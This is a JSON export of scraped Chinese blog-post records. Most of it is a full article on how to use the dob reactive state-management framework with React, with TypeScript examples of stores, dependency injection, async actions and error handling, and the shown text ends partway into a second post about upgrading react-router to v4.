{"_id":{"$oid":"5a4cc38885472a29ac40336e"},"id":"5a48a48f6fb9a0450770028b","author":{"$oid":"5a4cc38785472a29ac403351"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"精读《dob - 框架使用》","meta":{"likeCount":0},"tag":["React.js","Redux","前端","JavaScript"],"comment":[],"shortContent":"本系列分三部曲：《框架实现》 《框架使用》 与 《跳出框架看哲学》，这三篇是我对数据流阶段性的总结，正好补充之前过时的文章。 本篇是 《框架使用》。 现在我们团队也在重新思考数据流的价值，在业务不断发展，业务场景增多时，一个固定的数据流方案可能难以覆盖所有场景，在所有业务里都用…","content":"\u003cp\u003e本系列分三部曲：《框架实现》 《框架使用》 与 《跳出框架看哲学》，这三篇是我对数据流阶段性的总结，正好补充之前过时的文章。\u003c/p\u003e\n\u003cp\u003e本篇是 《框架使用》。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e1 引言\u003c/h2\u003e\n\u003cp\u003e现在我们团队也在重新思考数据流的价值，在业务不断发展，业务场景增多时，一个固定的数据流方案可能难以覆盖所有场景，在所有业务里都用得爽。特别在前端数据层很薄的场景下，在数据流治理上花功夫反倒是本末倒置。\u003c/p\u003e\n\u003cp\u003e业务场景通常很复杂，但是对技术的探索往往只追求理想情况下的效果，所以很多人草草阅读完别人的经验，给自己业务操刀时，会听到一些反对的声音，而实际效果也差强人意。\u003c/p\u003e\n\u003cp\u003e所以在阅读文章之前，应该先认识到数据流只是项目中非常微小的一环，而且每个具体方案都很看场景，就算用对了路子，带来的提效也不一定很明显。\u003c/p\u003e\n\u003cp\u003e2017 年 Redux 依然是主流，可能到 18 年还是。大家吐槽归吐槽，最终活还是得干，Redux 还是得用，就算分析出 js 天生不适合函数式，也依然一条路走到黑，因为谁也不知道未来会如何发展，redux 生态虽然用得繁琐，但普适性强，忍一忍，生活也能继续过。\u003c/p\u003e\n\u003cp\u003eDob 和 Mobx 类似，也只是数据流中响应式方案的一个分支，思考也是比较理想化的，因此可能也摆脱不了中看不中用的命运，谁叫业务场景那么多呢。\u003c/p\u003e\n\u003cp\u003e不过相对而言，应该算是接地气一些，它既没有要求纯函数式和分离副作用，也没有 cyclejs 那么抽象，只要入门的面向对象，就可以用好。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e2 精读 dob 框架使用\u003c/h2\u003e\n\u003cp\u003e使用 redux 时，很多时候是傻傻分不清要不要将结构化数据拍平，再分别订阅，或者分不清订阅后数据处理应该放在组件上还是全局。这是因为 redux 破坏了 react 分形设计，在 \u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/32273365\"\u003e最近的一次讨论记录\u003c/a\u003e 有说到。而许多基于 redux 的分形方案都是 “伪” 分形的，偷偷利用 \u003ccode\u003ereplaceReducer\u003c/code\u003e 做一些动态 reducer 注册，再绑定到全局。\u003c/p\u003e\n\u003cp\u003e讨论理想数据流方案比较痛苦，而且引言里说到，很多业务场景下收益也不大，所以可以考虑结合工程化思维解决，将组件类型区分开，分为普通组件与业务组件，普通组件不使用数据流，业务组件绑定全局数据流，可以避免纠结。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eStore 如何管理\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e使用 Mobx 时，文档告诉我们它具有依赖追踪、监听等许多能力，但没有好的实践例子做指导，看完了 todoMvc 觉得学完了 90%，在项目中实践后发现无从下手。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e所谓最佳实践，是基于某种约定或约束，让代码可读性、可维护性更好的方案。约定是活的，不遵守也没事，约束是死的，不遵守就无法运行。约束大部分由框架提供，比如开启严格模式后，禁止在 Action 外修改变量。然而纠结最多的地方还是在约定上，我在写 \u003ca target=\"_blank\" href=\"https://github.com/dobjs/dob\"\u003edob\u003c/a\u003e 框架前后，总结出了一套使用约定，可能仅对这种响应式数据流管用。\u003c/p\u003e\n\u003cp\u003e使用数据流，第一要做的事情就是管理数据，要解决 Store 放在哪，怎么放的问题。其实还有个前置条件：要不要用 Store 的问题。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e要不要用 store\u003c/h4\u003e\n\u003cp\u003e首先，最简单的组件肯定不需要用数据流。那么组件复杂时，如果数据流本身具有分形功能，那么可用可不用。所谓具有分形功能的数据流，是贴着 react 分形功能，将其包装成任具有分形能力的组件：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\" lang=\"typescript\"\u003eimport { combineStores, observable, inject, observe } from 'dob'\nimport { Connect } from 'dob-react'\n\n@observable\nclass Store { name = 123 }\n\nclass Action {\n  @inject(Store) store: Store\n\n  changeName = () =\u0026gt; { this.store.name = 456 }\n}\n\nconst stores = combineStores({ Store, Action })\n\n@Connect(stores)\nclass App extends React.Component\u0026lt;typeof stores, any\u0026gt; {\n  render() {\n    return \u0026lt;div onClick={this.props.Action.changeName}\u0026gt;{this.props.Store.name}\u0026lt;/div\u0026gt;\n  }\n}\n\nReactDOM.render(\u0026lt;App /\u0026gt; , document.getElementById('react-dom'))\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003edob 就是这样的框架，上面例子中，点击文字可以触发刷新，\u003cstrong\u003e即便根 dom 节点没有 \u003ccode\u003eProvider\u003c/code\u003e\u003c/strong\u003e。这意味着这个组件不论放到任何环境，都可以独立运行，成为任何项目中的一部分。这种组件虽然用了数据流，但是和普通 React 组件完全无区别，可以放心使用。\u003c/p\u003e\n\u003cp\u003e如果是伪分形的数据流，可能在 \u003ccode\u003eReactDOM.render\u003c/code\u003e 需要特定的 \u003ccode\u003eProvider\u003c/code\u003e 配合才可使用，那么这个组件就不具备可迁移能力。如果别人不幸安装了这种组件，就需要在项目根目录安装一个全家桶。\u003c/p\u003e\n\u003cp\u003e问：虽然数据流+组件具备完全分形能力，但若此组件对 props 有响应式要求，那还是有对该数据流框架的隐形依赖。\u003c/p\u003e\n\u003cp\u003e答：是的，如果组件要求接收的 props 是 \u003ccode\u003eobservable\u003c/code\u003e 化的，以便在其变化时自动 rerender，那当某个环境传递了普通 props，这个组件的部分功能将失效。其实 props 属于 react 的通用连接桥梁，因此组件只应该依赖普通对象的 props，内部可以再对其 \u003ccode\u003eobservable\u003c/code\u003e 化，以具备完备的可迁移能力。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e怎么用 store\u003c/h4\u003e\n\u003cp\u003eReact 虽然可以完全模块化，但实际项目中模块一定分为通用组件与业务组件，页面模块也可以当作业务组件。复杂的网站由数据驱动比较好，既然是数据驱动，那么可以将业务组件与数据的连接移到顶层管理，一般通过页面顶层包裹 \u003ccode\u003eProvider\u003c/code\u003e 实现：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\" lang=\"typescript\"\u003eimport { combineStores, observable, inject, observe } from 'dob'\nimport { Connect } from 'dob-react'\n\n@observable\nclass Store { name = 123 }\n\nclass Action {\n  @inject(Store) store: Store\n\n  changeName = () =\u0026gt; { this.store.name = 456 }\n}\n\nconst stores = combineStores({ Store, Action })\n\nReactDOM.render(\n  \u0026lt;Provider {...store}\u0026gt;\n    \u0026lt;App /\u0026gt;\n  \u0026lt;/Provider\u0026gt;  \n, document.getElementById('react-dom'))\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e本质上只是改变了 Store 定义的位置，而组件使用方式依然不变：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\" lang=\"typescript\"\u003e@Connect\nclass App extends React.Component\u0026lt;typeof stores, any\u0026gt; {\n  render() {\n    return \u0026lt;div onClick={this.props.Action.changeName}\u0026gt;{this.props.Store.name}\u0026lt;/div\u0026gt;\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e有一个区别是 \u003ccode\u003e@Connect\u003c/code\u003e 不需要带参数了，因为如果全局注册了 \u003ccode\u003eProvider\u003c/code\u003e，会默认透传到 \u003ccode\u003eConnect\u003c/code\u003e 中。与分形相反，这种设计会导致组件无法迁移到其他项目单独运行，但好处是可以在本项目中任意移动。\u003c/p\u003e\n\u003cp\u003e分形的组件对结构强依赖，只要给定需要的 props 就可以完成功能，而全局数据流的组件几乎可以完全不依赖结构，所有 props 都从全局 store 获取。\u003c/p\u003e\n\u003cp\u003e其实说到这里，可以发现这两点是难以合二为一的，我们可以预先将组件分为业务耦合与非业务耦合两种，让业务耦合的组件依赖全局数据流，让非业务耦合组件保持分形能力。\u003c/p\u003e\n\u003cp\u003e如果有更好的 Store 管理方式，可以在我的 \u003ca target=\"_blank\" href=\"https://github.com/ascoders\"\u003egithub\u003c/a\u003e 和 \u003ca target=\"_blank\" href=\"https://www.zhihu.com/people/huang-zi-yi-83/activities\"\u003e知乎\u003c/a\u003e 深入聊聊。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e每个组件都要 Connect 吗\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e对于 Mvvm 思想的库，Connect 概念不仅仅在于注入数据（与 redux 不同），还会监听数据的变化触发 rerender。那么每个组件需要 Connect 吗？\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e从数据流功能来说，没有用到数据流的组件当然不需要 Connect，但业务组件保持着未来不确定性（业务不确定），所以保持每个业务组件的 Connect 便于后期维护。\u003c/p\u003e\n\u003cp\u003e而且 Connect 可能还会做其他优化工作，比如 dob 的 Connect 不仅会注入数据，完成组件自动 render，还会保证组件的 \u003ccode\u003ePureRender\u003c/code\u003e，如果对 dob 原理感兴趣，可以阅读 \u003ca target=\"_blank\" href=\"https://github.com/dt-fe/weekly/blob/master/35.%E7%B2%BE%E8%AF%BB%E3%80%8Adob%20-%20%E6%A1%86%E6%9E%B6%E5%AE%9E%E7%8E%B0%E3%80%8B.md\"\u003e精读《dob - 框架实现》\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e其实个议题只是非常微小的点，不过现实就是讽刺的，很多时候多会纠结在这种小点子上，所以单独花费篇幅说几句。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e数据流是否要扁平化\u003c/h3\u003e\n\u003cp\u003eStore 扁平化有很大原因是 js 对 immutable 支持力度不够，导致对深层数据修改非常麻烦导致的，虽然 \u003ccode\u003eimmutable.js\u003c/code\u003e 这类库可以通过字符串快速操作，但这种使用方式必然会被不断发展的前端浪潮所淹没，我们不可能看到 js 标准推荐我们使用字符串访问对象属性。\u003c/p\u003e\n\u003cp\u003e通过字符串访问对象属性，和 lodash 的 \u003ccode\u003e_.get\u003c/code\u003e 类似，不过对于安全访问属性，也已经有 \u003ca target=\"_blank\" href=\"https://github.com/tc39/proposal-optional-chaining\"\u003eproposal-optional-chaining\u003c/a\u003e 的提案在语法层面解决，同样 immutable 的便捷操作也需要一种标准方式完成。实际上不用等待另一个提案，利用 js 现有能力就可以模拟原生 immutable 支持的效果。\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/dobjs/dob-redux\"\u003edob-redux\u003c/a\u003e 可以通过类似 \u003ccode\u003ethis.store.articles.push(article)\u003c/code\u003e 的 mutable 写法，实现与 \u003ccode\u003ereact-redux\u003c/code\u003e 的对接，内部自然做掉了类似 \u003ccode\u003eimmutable.set\u003c/code\u003e 的事情，感兴趣可以读读我的这篇文章：\u003ca target=\"_blank\" href=\"https://github.com/ascoders/blog/issues/21\"\u003eRedux 使用可变数据结构\u003c/a\u003e，介绍了这个黑魔法的实现原理。\u003c/p\u003e\n\u003cp\u003e有点扯远了，那么数据流扁平化本质解决的是数据格式规范问题。比如 \u003ca target=\"_blank\" href=\"https://github.com/paularmstrong/normalizr\"\u003enormalizr\u003c/a\u003e 就是一种标准数据规范的推进，很多时候我们都将冗余、或者错误归类的数据存入 Store，那维护性自然比较差，Redux 推崇的应当是正确的数据格式化，而不是一昧追求扁平化。\u003c/p\u003e\n\u003cp\u003e对于前端数据流很薄的场景，也不是随便处理数据就完事了。还有许多事可做，比如使用 node 微服务对后端数据标准化、封装一些标准格式处理组件，把很薄的数据做成零厚度，业务代码可以对简单的数据流完全无感知等等。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e异步与副作用\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003eRedux 自然而然用 action 隔离了副作用与异步，那在只有 action 的 Mvvm 开发模式中，异步需要如何隔离？Mvvm 真的完美解决了 Redux 避而远之的异步问题吗？\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e在使用 dob 框架时，异步后赋值需要非常小心：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\" lang=\"typescript\"\u003e\u003cspan class=\"hljs-meta\"\u003e@Action\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e getUserInfo() {\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e userInfo = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e fetchUser()\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.store.user.data = userInfo \u003cspan class=\"hljs-comment\"\u003e// 严格模式下将会报错，因为脱离了 Action 作用域。\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e原因是 \u003ccode\u003eawait\u003c/code\u003e 只是假装用同步写异步，当一个 \u003ccode\u003eawait\u003c/code\u003e 开始时，当前函数的栈已经退出，因此后续代码都不在一个 \u003ccode\u003eAction\u003c/code\u003e 中，所以一般的解法是显示申明 \u003ccode\u003eAction\u003c/code\u003e 的显示申明大法：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\" lang=\"typescript\"\u003e\u003cspan class=\"hljs-meta\"\u003e@Action\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e getUserInfo() {\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e userInfo = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e fetchUser()\n  Action(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.store.user.data = userInfo\n  })\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这说明了异步需要当心！Redux 将异步隔离到 \u003ccode\u003eReducer\u003c/code\u003e 之外很正确，只要涉及到数据流变化的操作是同步的，外面 \u003ccode\u003eAction\u003c/code\u003e 怎么千奇百怪，\u003ccode\u003eReducer\u003c/code\u003e 都可以高枕无忧。\u003c/p\u003e\n\u003cp\u003e其实 redux 的做法与下面代码类似：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\" lang=\"typescript\"\u003e\u003cspan class=\"hljs-meta\"\u003e@Action\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e getUserInfo() { \u003cspan class=\"hljs-comment\"\u003e// 类 redux action\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e userInfo = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e fetchUser()\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.setUserInfo(userInfo)\n}\n\n\u003cspan class=\"hljs-meta\"\u003e@Action\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e setUserInfo(userInfo) { \u003cspan class=\"hljs-comment\"\u003e// 类 redux reduer\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.store.user.data = userInfo\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e所以这是 dob 中对异步的另一种处理方法，称作隔离大法吧。所以在响应式框架中，显示申明大法与隔离大法都可以解决异步问题，代码也显得更加灵活。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e请求自动重发\u003c/h3\u003e\n\u003cp\u003e响应式框架的另一个好处在于可以自动触发，比如自动触发请求、自动触发操作等等。\u003c/p\u003e\n\u003cp\u003e比如我们希望当请求参数改变时，可以自动重发，一般的，在 react 中需要这么申明：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\" lang=\"typescript\"\u003ecomponentWillMount() {\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.fetch({ url: \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props.url, userName: \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props.userName })\n}\n\ncomponentWillReceiveProps(nextProps) {\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\n    nextProps.url !== \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props.url ||\n    nextProps.userName !== \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props.userName\n  ) {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.fetch({ url: nextProps.url, userName: nextProps.userName })\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在 dob 这类框架中，以下代码的功能是等价的：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\" lang=\"typescript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { observe } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'dob'\u003c/span\u003e\n\ncomponentWillMount() {\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.signal = observe(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003e()\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.fetch({ url: \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props.url, userName: \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props.userName })\n  })\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e其神奇地方在于，\u003ccode\u003eobserve\u003c/code\u003e 回调函数内用到的变量（observable 后的变量）改变时，会重新执行此回调函数。而 \u003ccode\u003ecomponentWillReceiveProps\u003c/code\u003e 内做的判断，其实是利用 react 的生命周期手工监听变量是否改变，如果改变了就触发请求函数，然而这一系列操作都可以让 \u003ccode\u003eobserve\u003c/code\u003e 函数代劳。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eobserve\u003c/code\u003e 有点像更自动化的 \u003ccode\u003eaddEventListener\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\" lang=\"typescript\"\u003e\u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.addEventListener(\u003cspan class=\"hljs-string\"\u003e'someThingChanged'\u003c/span\u003e, \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.fetch)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e所以组件销毁时不要忘了取消监听：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\" lang=\"typescript\"\u003e\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.signal.unobserve()\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最近我们团队也在探索如何更方便的利用这一特性，正在考虑实现一个自动请求库，如果有好的建议，也非常欢迎一起交流。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e类型推导\u003c/h3\u003e\n\u003cp\u003e如果你在使用 redux，可以参考 \u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/32112508\"\u003e你所不知道的 Typescript 与 Redux 类型优化\u003c/a\u003e 优化 typescript 下 redux 类型的推导，如果使用 dob 或 mobx 之类的框架，类型推导就更简单了：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\" lang=\"typescript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { combineStores, Connect } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'dob'\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e stores = combineStores({ Store, Action })\n\n\u003cspan class=\"hljs-meta\"\u003e@Connect\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e Component \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e React.PureComponent\u0026lt;\u003cspan class=\"hljs-keyword\"\u003etypeof\u003c/span\u003e stores, \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e\u0026gt; {\n  render() {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props.Store \u003cspan class=\"hljs-comment\"\u003e// 几行代码便获得了完整类型支持\u003c/span\u003e\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这都得益于响应式数据流是基于面向对象方式操作，可以自然的推导出类型。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eStore 之间如何引用\u003c/h3\u003e\n\u003cp\u003e复杂的数据流必然存在 Store 与 Action 之间相互引用，比较推荐依赖注入的方式解决，这也是 dob 推崇的良好实践之一。\u003c/p\u003e\n\u003cp\u003e当然依赖注入不能滥用，比如不要存在循环依赖，虽然手握灵活的语法，但在下手写代码之前，需要对数据流有一套较为完整的规划，比如简单的用户、文章、评论场景，我们可以这么设计数据流：\u003c/p\u003e\n\u003cp\u003e分别建立 \u003ccode\u003eUserStore\u003c/code\u003e \u003ccode\u003eArticleStore\u003c/code\u003e \u003ccode\u003eReplyStore\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\" lang=\"typescript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e { inject } \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'dob'\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e UserStore {\n  users\n}\n\n\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e ReplyStore {\n  \u003cspan class=\"hljs-meta\"\u003e@inject\u003c/span\u003e(UserStore) userStore: UserStore\n\n  replys \u003cspan class=\"hljs-comment\"\u003e// each.user\u003c/span\u003e\n}\n\n\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e ArticleStore {\n  \u003cspan class=\"hljs-meta\"\u003e@inject\u003c/span\u003e(UserStore) userStore: UserStore\n  \u003cspan class=\"hljs-meta\"\u003e@inject\u003c/span\u003e(ReplyStore) replyStore: ReplyStore\n\n  articles \u003cspan class=\"hljs-comment\"\u003e// each.replys each.user\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e每个评论都涉及到用户信息，所以 \u003ccode\u003eReplyStore\u003c/code\u003e 注入了 \u003ccode\u003eUserStore\u003c/code\u003e，每个文章都包含作者与评论信息，所以 \u003ccode\u003eArticleStore\u003c/code\u003e 注入了 \u003ccode\u003eUserStore\u003c/code\u003e 与 \u003ccode\u003eReplyStore\u003c/code\u003e，可以看出 Store 之间依赖关系应当是树形，而不是环形。\u003c/p\u003e\n\u003cp\u003e最终 Action 对 Store 的操作也是通过注入来完成，而由于 Store 之间已经注入完了，Action 可以只操作对应的 Store，必要的时候再注入额外 Store，而且也不会存在循环依赖：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\" lang=\"typescript\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e UserAction {\n  \u003cspan class=\"hljs-meta\"\u003e@inject\u003c/span\u003e(UserStore) userStore: UserStore\n}\n\n\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e ReplyAction {\n  \u003cspan class=\"hljs-meta\"\u003e@inject\u003c/span\u003e(ReplyStore) replyStore: ReplyStore\n}\n\n\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e ArticleAction {\n  \u003cspan class=\"hljs-meta\"\u003e@inject\u003c/span\u003e(ArticleStore) articleStore: ArticleStore\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最后，不建议在局部 Store 注入全局 Store，或者局部 Action 注入全局 Store，因为这会破坏局部数据流的分形特点，切记保证非业务组件的独立性，把全局绑定交给业务组件处理。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eAction 的错误处理\u003c/h3\u003e\n\u003cp\u003e比较优雅的方式，是编写类级别的装饰器，统一捕获 Action 的异常并抛出：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs typescript\" lang=\"typescript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e errorCatch = \u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eerrorHandler?: (\u003cspan class=\"hljs-params\"\u003eerror?: \u003cspan class=\"hljs-built_in\"\u003eError\u003c/span\u003e\u003c/span\u003e) =\u0026gt; \u003cspan class=\"hljs-built_in\"\u003evoid\u003c/span\u003e\u003c/span\u003e) =\u0026gt;\u003c/span\u003e (target: \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e) =\u0026gt; {\n    \u003cspan class=\"hljs-built_in\"\u003eObject\u003c/span\u003e.getOwnPropertyNames(target.prototype).forEach(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003ekey\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n        \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e func = target.prototype[key]\n        target.prototype[key] = \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e (...args: \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e[]) =\u0026gt; {\n            \u003cspan class=\"hljs-keyword\"\u003etry\u003c/span\u003e {\n                \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e func.apply(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e, args)\n            } \u003cspan class=\"hljs-keyword\"\u003ecatch\u003c/span\u003e (error) {\n                errorHandler \u0026amp;\u0026amp; errorHandler(error)\n            }\n        }\n    })\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e target\n}\n\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e myErrorCatch = errorCatch(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eerror\u003c/span\u003e =\u0026gt;\u003c/span\u003e {\n    \u003cspan class=\"hljs-comment\"\u003e// 上报异常信息 error\u003c/span\u003e\n})\n\n\u003cspan class=\"hljs-meta\"\u003e@myErrorCatch\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e ArticleAction {\n  \u003cspan class=\"hljs-meta\"\u003e@inject\u003c/span\u003e(ArticleStore) articleStore: ArticleStore\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e当任意步骤触发异常，await 之后的代码将停止执行，并将异常上报到前端监控平台，比如我们内部的 \u003ca target=\"_blank\" href=\"https://zhuanlan.zhihu.com/p/32262716\"\u003eclue\u003c/a\u003e 系统。关于异常处理更多信息，可以访问我较早的一篇文章：\u003ca target=\"_blank\" href=\"https://github.com/ascoders/blog/issues/14\"\u003eCallback Promise Generator Async-Await 和异常处理的演进\u003c/a\u003e。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e3 总结\u003c/h2\u003e\n\u003cp\u003e准确区分出业务与非业务组件、写代码前先设计数据流的依赖关系、异步时注意分离，就可以解决绝大部分业务场景的问题，实在遇到特殊情况可以使用 \u003ccode\u003eobserve\u003c/code\u003e 监听数据变化，由此可以拓展出比如请求自动重发的功能，运用得当可以解决余下比较棘手的特殊需求。\u003c/p\u003e\n\u003cp\u003e虽然数据流只是项目中非常微小的一环，但如果想让整个项目保持良好的可维护性，需要把各个环节做精致。\u003c/p\u003e\n\u003cp\u003e这篇文章写于 2017 年最后一天，祝大家元旦快乐！\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e更多讨论\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e讨论地址是：\u003ca target=\"_blank\" href=\"https://github.com/dt-fe/weekly/issues/53\"\u003e精读《dob - 框架使用》 · Issue #53 · dt-fe/weekly\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003e如果你想参与讨论，请\u003ca target=\"_blank\" href=\"https://github.com/dt-fe/weekly\"\u003e点击这里\u003c/a\u003e，每周都有新的主题，每周五发布。\u003c/strong\u003e\u003c/p\u003e\n","buildTime":"1514971679.5228","__v":0}
{"_id":{"$oid":"5a4cc38885472a29ac403370"},"id":"5a45f536f265da431c70a170","author":{"$oid":"5a4cc38785472a29ac403354"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"react-router 升级小记","meta":{"likeCount":0},"tag":["React.js","Redux","前端","JavaScript"],"comment":[],"shortContent":"最近将公司项目的 react-router 从 v3 版本升到了 v4 版本，react-router v4 跟 v3 完全不兼容，是一次彻底的重写。这也给升级造成了极大的困难，与其说升级不如说是对 router 层重写。之前我也将项目的 react 从 v15 版本升级到了 …","content":"\u003ch2 class=\"heading\"\u003e前言\u003c/h2\u003e\n\u003cp\u003e最近将公司项目的 react-router 从 v3 版本升到了 v4 版本，react-router v4 跟 v3 完全不兼容，是一次彻底的重写。这也给升级造成了极大的困难，与其说升级不如说是对 router 层重写。之前我也将项目的 react 从 v15 版本升级到了 v16 版本，相较而言升级 react-router 比升级 react 困难多了。升级过程中踩了不少的坑，也有一些值得分享的点。写成一篇小文，供大家参考。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e依赖升级\u003c/h2\u003e\n\u003cp\u003ereact-router v4 